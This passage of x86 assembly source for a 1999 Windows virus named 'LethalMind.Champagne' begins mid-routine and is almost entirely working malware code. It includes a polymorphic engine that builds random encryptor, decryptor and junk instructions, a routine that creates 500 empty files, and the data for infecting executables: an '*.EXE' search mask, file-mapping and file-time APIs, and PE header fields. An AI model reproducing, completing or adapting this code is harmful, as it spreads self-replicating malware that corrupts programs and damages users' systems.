      je       Again
      cmp      al,[RegUsedAsDelta+ebp]
      je       Again
regOk:
      pop      ebx
      ret
ChooseHarmlessReg endp

deax = 000000b
decx = 000001b
dedx = 000010b
debx = 000011b
desp = 000100b
debp = 000101b
desi = 000110b
dedi = 000111b

seax = 000000b
secx = 001000b
sedx = 010000b
sebx = 011000b
sesp = 100000b
sebp = 101000b
sesi = 110000b
sedi = 111000b

CryptRoutines:
dd      offset GenerateXorImm&Reg
dd      offset GenerateSubImm&Reg
dd      offset GenerateAddImm&Reg
dd      offset GenerateRorImm&Reg
dd      offset GenerateRolImm&Reg
dd      offset GenerateDecReg
dd      offset GenerateIncReg
dd      offset GenerateNotReg
dd      offset GenerateNegReg

NumberOfCryptor equ ($-CryptRoutines)/4

DecryptRoutines:
dd      offset GenerateXorImm&Reg
dd      offset GenerateAddImm&Reg
dd      offset GenerateSubImm&Reg
dd      offset GenerateRolImm&Reg
dd      offset GenerateRorImm&Reg
dd      offset GenerateIncReg
dd      offset GenerateDecReg
dd      offset GenerateNotReg
dd      offset GenerateNegReg

Junkroutines:
RegToRegInstr:
dd      offset GenerateMovRegtoReg
dd      offset GenerateMovRegtoReg
dd      offset GenerateAddRegtoReg
dd      offset GenerateXorRegtoReg
dd      offset GenerateSubRegtoReg
RegAndImmInstr:
dd      offset GenerateMovImmtoReg
dd      offset GenerateXorImm&Reg
dd      offset GenerateSubImm&Reg
dd      offset GenerateAddImm&Reg
dd      offset GenerateRorImm&Reg
dd      offset GenerateRolImm&Reg
OneRegInstr:
dd      offset GenerateDecReg
dd      offset GenerateIncReg
dd      offset GenerateNotReg
dd      offset GenerateNegReg
dd      offset GeneratePushJunk

NumberOfJunk        equ ($-Junkroutines)/4
NumberOfOneReg      equ ($-OneRegInstr)/4
NumberOfRegImm      equ (OneRegInstr-RegAndImmInstr)/4
NumberOfTwoReg      equ (RegAndImmInstr-Junkroutines)/4


; EAX holds its last 6 bits the registers to use
GenerateMovRegtoReg proc
      lea      esi,[MovRegToRegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],2
      ret
MovRegToRegBlank db 8Bh,11000000b
GenerateMovRegtoReg endp

GenerateMovRegPtrtoReg proc
      lea      esi,[MovRegPtrToRegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],2
      ret
MovRegPtrToRegBlank db 8Bh,00000000b
GenerateMovRegPtrtoReg endp

GenerateMovRegtoRegPtr proc
      lea      esi,[MovRegToRegPtrBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],2
      ret
MovRegToRegPtrBlank db 89h,00000000b
GenerateMovRegtoRegPtr endp

; EAX holds its last 3 bits the register to use
; EBX holds the immediate value to use

GenerateMovImmtoReg proc
      lea      esi,[MovImmToRegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsd
      or       BYTE PTR [CurrentInstruction+ebp],al
      xchg     ebx,eax
      lea      edi,DWORD PTR[CurrentInstruction+ebp+1]
      stosd
      mov      BYTE PTR [CurrentInstructionSize+ebp],5
      ret
MovImmToRegBlank db 10111000b,0,0,0,0
GenerateMovImmtoReg endp

GenerateAddRegtoReg proc
      lea      esi,[AddRegToRegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],2
      ret
AddRegToRegBlank db 03h,11000000b
GenerateAddRegtoReg endp

GenerateSubRegtoReg proc
      lea      esi,[SubRegToRegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],2
      ret
SubRegToRegBlank db 2bh,11000000b
GenerateSubRegtoReg endp

GenerateXorRegtoReg proc
      lea      esi,[XorRegToRegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],2
      ret
XorRegToRegBlank db 33h,11000000b
GenerateXorRegtoReg endp

; EAX holds its last 3 bits the register to use

GenerateDecReg proc
      mov      bl,BYTE PTR [DecRegBlank+ebp]
      mov      BYTE PTR [CurrentInstruction+ebp],bl
      or       BYTE PTR [CurrentInstruction+ebp],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],1
      ret
DecRegBlank db 01001000b
GenerateDecReg endp

; EAX holds its last 3 bits the register to use

GenerateIncReg proc
      mov      bl,BYTE PTR [IncRegBlank+ebp]
      mov      BYTE PTR [CurrentInstruction+ebp],bl
      or       BYTE PTR [CurrentInstruction+ebp],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],1
      ret
IncRegBlank db 01000000b
GenerateIncReg endp

;      EAX holds its last 3 bits the register to use

GeneratePushJunk proc
      mov      bl,BYTE PTR [PushRegBlank+ebp]
      mov      BYTE PTR [CurrentInstruction+ebp],bl
      or       BYTE PTR [CurrentInstruction+ebp],al
      mov      bl,BYTE PTR [PopRegBlank+ebp]
      mov      BYTE PTR [CurrentInstruction+ebp+1],bl
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],2
      ret
GeneratePushJunk endp


GeneratePushReg proc
      mov      bl,BYTE PTR [PushRegBlank+ebp]
      mov      BYTE PTR [CurrentInstruction+ebp],bl
      or       BYTE PTR [CurrentInstruction+ebp],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],1
      ret
PushRegBlank db 01010000b
GeneratePushReg endp

; EAX holds its last 3 bits the register to use

GeneratePopReg proc
      mov      bl,BYTE PTR [PopRegBlank+ebp]
      mov      BYTE PTR [CurrentInstruction+ebp],bl
      or       BYTE PTR [CurrentInstruction+ebp],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],1
      ret
PopRegBlank db 01011000b
GeneratePopReg endp

; EAX holds its last 6 bits the registers to use
; EBX holds the immediate value to use

GenerateLeaImm&Reg proc
      lea      esi,[LeaImm&RegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      movsd
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      xchg     ebx,eax
      lea      edi,DWORD PTR[CurrentInstruction+ebp+2]
      stosd
      mov      BYTE PTR [CurrentInstructionSize+ebp],6
      ret
LeaImm&RegBlank      db 8Dh,10000000b,0,0,0,0
GenerateLeaImm&Reg endp

; EAX holds its last 3 bits the registers to use
; EBX holds the immediate value to use

GenerateXorImm&Reg proc
      lea      esi,[XorImm&RegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      movsd
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      xchg     ebx,eax
      lea      edi,DWORD PTR[CurrentInstruction+ebp+2]
      stosd
      mov      BYTE PTR [CurrentInstructionSize+ebp],6
      ret
XorImm&RegBlank      db 81h,11110000b,0,0,0,0
GenerateXorImm&Reg endp

; EAX holds its last 3 bits the registers to use
; EBX holds the immediate value to use

GenerateSubImm&Reg proc
      lea      esi,[SubImm&RegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      movsd
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      xchg     ebx,eax
      lea      edi,DWORD PTR[CurrentInstruction+ebp+2]
      stosd
      mov      BYTE PTR [CurrentInstructionSize+ebp],6
      ret
SubImm&RegBlank      db 81h,11101000b,0,0,0,0
GenerateSubImm&Reg endp

; EAX holds its last 3 bits the registers to use
; EBX holds the immediate value to use

GenerateAddImm&Reg proc
      lea      esi,[AddImm&RegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      movsd
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      xchg     ebx,eax
      lea      edi,DWORD PTR[CurrentInstruction+ebp+2]
      stosd
      mov      BYTE PTR [CurrentInstructionSize+ebp],6
      ret
AddImm&RegBlank      db 81h,11000000b,0,0,0,0
GenerateAddImm&Reg endp

GenerateRorImm&Reg proc
      lea      esi,[RorImm&RegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      movsb
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR[CurrentInstruction+ebp+2],bl
      mov      BYTE PTR [CurrentInstructionSize+ebp],3
      ret
RorImm&RegBlank      db 0C1h,11001000b,0
GenerateRorImm&Reg endp

GenerateRolImm&Reg proc
      lea      esi,[RolImm&RegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      movsb
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR[CurrentInstruction+ebp+2],bl
      mov      BYTE PTR [CurrentInstructionSize+ebp],3
      ret
RolImm&RegBlank      db 0C1h,11000000b,0
GenerateRolImm&Reg endp

GenerateNotReg proc
      lea      esi,[NotRegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],2
      ret
NotRegBlank db 0F7h,11010000b
GenerateNotReg endp

GenerateNegReg proc
      lea      esi,[NegRegBlank+ebp]
      lea      edi,[CurrentInstruction+ebp]
      movsb
      movsb
      or       BYTE PTR [CurrentInstruction+ebp+1],al
      mov      BYTE PTR [CurrentInstructionSize+ebp],2
      ret
NegRegBlank db 0F7h,11011000b
GenerateNegReg endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Create 500 empty files with cool names =)
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

WriteGarbageFiles proc
      push     500d
      pop      ecx
CopyFile:
      push     ecx
      lea      edi,[NameOfFile+ebp]
      push     6
      pop      ecx
RandomString:
      push     26d
      pop      eax
      call     rand_in_range32
      add      al,'A'
      stosb
      loop     RandomString
      lea      edi,[NameOfFile+ebp]
      cdq
      push     edx
      push     FILE_FLAG_WRITE_THROUGH or FILE_FLAG_NO_BUFFERING 
      push     CREATE_ALWAYS
      push     edx
      push     edx
      push     GENERIC_WRITE 
      push     edi
      call     [aCreateFileA+ebp]
      push     eax
      call     [aCloseHandle+ebp]
      pop      ecx
      loop     CopyFile
      ret
WriteGarbageFiles      endp


SavedIE2                dd      0
SavedIE                 dd      offset HostFile
BaseDisk                db      'C:\',0
EXEMask                 db      '*.EXE',0
NameOfFile              db      6      dup      (0)
db      '@LethalMind.Champagne 1.1 released the 22th of August 1999. Greetings to 29A, Darkman, Benny, Pockets, Rod, Mist, Thermo, Mdrg, Ahine and all who have helped me. Je t''aime Laurence !!',0


beginAPIlist:
NumberOfAPIs            equ     18d

sCloseHandle            db      'CloseHandle',0
sCreateFileA            db      'CreateFileA',0
sCreateFileMappingA     db      'CreateFileMappingA',0
sDeleteFileA            db      'DeleteFileA',0
sFindClose              db      'FindClose',0
sFindFirstFileA         db      'FindFirstFileA',0
sFindNextFileA          db      'FindNextFileA',0
sGetDriveTypeA          db      'GetDriveTypeA',0
sGetFileAttributesA     db      'GetFileAttributesA',0
sGetFileTimeA           db      'GetFileTime',0
sGetSystemDirectory     db      'GetSystemDirectoryA',0
sGetSystemTime          db      'GetSystemTime',0
sGetWindowsDirectory    db      'GetWindowsDirectoryA',0
sSetCurrentDirectory    db      'SetCurrentDirectoryA',0
sSetFileAttributesA     db      'SetFileAttributesA',0
sSetFileTime            db      'SetFileTime',0
sMapViewOfFile          db      'MapViewOfFile',0
sUnmapViewOfFile        db      'UnmapViewOfFile',0

sGetProc                db      'GetProcAddress',0

OriginalHost            db      100d dup (90h)
StarStar                db      '*',0

Cryptor:
      push     ecx
      lodsd
CryptorInstructions     db      100d dup (90h)
EndCryptor:
      stosd
      pop      ecx
      dec      ecx
      test     ecx,ecx
      jne      Cryptor
      ret

RegUsedToEncrypt        db      deax
RegUsedAsPointer        db      dedi
RegUsedAsPointer2       db      desi
RegUsedAsDelta          db      debp
RegUsedToLoop           db      decx
DirectoryBuffer         db      MAX_PATH dup (0)
KernelAdress            dd      0BFF70000h

EndCrypted:

db      7      dup      (?)

Decryptor:
buffer                  db      300d dup (90h)
db 0c3h


END_VIRUS:

beginAPIAdress:
aCloseHandle            dd      0
aCreateFileA            dd      0
aCreateFileMappingA     dd      0
aDeleteFileA            dd      0
aFindClose              dd      0
aFindFirstFileA         dd      0
aFindNextFileA          dd      0
aGetDriveTypeA          dd      0
aGetFileAttributesA     dd      0
aGetFileTimeA           dd      0
aGetSystemDirectory     dd      0
aGetSystemTime          dd      0
aGetWindowsDirectory    dd      0
aSetCurrentDirectory    dd      0
aSetFileAttributesA     dd      0
aSetFileTime            dd      0
aMapViewOfFile          dd      0
aUnmapViewOfFile        dd      0
endAPIlist:

ObjectAlign             dd      0
FileAlign               dd      0
FirstSection            dd      0
CallOrigin              dd      0
CurrentInstruction      db      30d dup (0)
CurrentInstructionSize  db      0
WhereToLoop             dd      0
CurrentDecryptorOffset  dd      0
RegToInit               dd      0
IncCounter              dd      0
NumberOfDir             dd      0
RandomDir               dd      0
aGetProc                dd      0

FileHandle              dd      0
MapHandle               dd      0
MappedBA                dd      0      ; Mapped file base address
PEHeader                dd      0


SavedAttrib             dd      0
SavedCreationT          dd      0
                        dd      0
SavedLastWriteT         dd      0
                        dd      0
SavedLastAccesT         dd      0
                        dd      0

FindData                WIN32_FIND_DATA      ?

rnd32_seed              dd      0
rnd32_seedfast          dd      0

my_system_time  equ this byte
time_year               dw      0000h
time_month              dw      0000h
time_dayofweek          dw      0000h
time_day                dw      0000h
time_hour               dw      0000h
time_minute             dw      0000h
time_seconds            dw      0000h
time_milisec            dw      0000h

VirtualAdd              equ     $-END_VIRUS

end start
end
